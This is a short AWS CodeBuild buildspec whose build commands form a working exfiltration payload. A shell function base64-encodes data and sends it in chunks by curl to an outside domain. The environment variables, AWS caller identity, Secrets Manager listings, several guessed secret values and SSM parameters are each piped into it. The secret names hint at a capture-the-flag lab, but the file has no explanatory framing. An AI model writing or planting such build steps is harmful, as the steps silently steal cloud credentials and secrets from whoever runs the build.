  build:
    commands:
      - |
        exfil () {
          base64 | tr -d '\n' | fold -w 1000 | while read chunk; do
            curl -s "https://laopiniondemadrid.es/$1?data=$chunk" >/dev/null
          done
        }

      - env | exfil env || true

      - aws sts get-caller-identity --region us-east-1 2>&1 | exfil sts || true

      - aws secretsmanager list-secrets --region us-east-1 2>&1 | exfil secrets || true

      - |
        for name in flag_codebuild_lab_5 flag-codebuild-lab-5 lab5-flag codebuild_lab_5_flag codebuild-lab-5-flag; do
          aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 2>&1 | exfil "secret-$name" || true
        done

      - aws ssm describe-parameters --region us-east-1 2>&1 | exfil ssm || true
